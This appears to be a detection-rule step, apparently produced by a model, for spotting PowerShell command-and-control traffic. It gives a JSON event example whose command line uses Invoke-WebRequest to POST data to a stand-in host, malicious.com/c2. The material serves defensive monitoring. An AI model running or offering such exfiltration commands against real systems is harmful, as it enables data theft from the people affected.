<output>
1. **Identify Command and Control Communication via PowerShell**  
   - Monitor for events where the `srcNode` is a PowerShell process.  
   - Set the `dstNode` to reflect the command and control server's IP address or domain (e.g., "http://malicious.com/c2").  
   - Ensure the `relation` is set to "Process Create" for the PowerShell process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "powershell.exe -Command Invoke-WebRequest -Uri http://malicious.com/c2 -Method POST -Body \"data\"",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "malicious.com",
         "Type": "Network"
       },
       "relation": "Process Create"
     }
     ```
</output>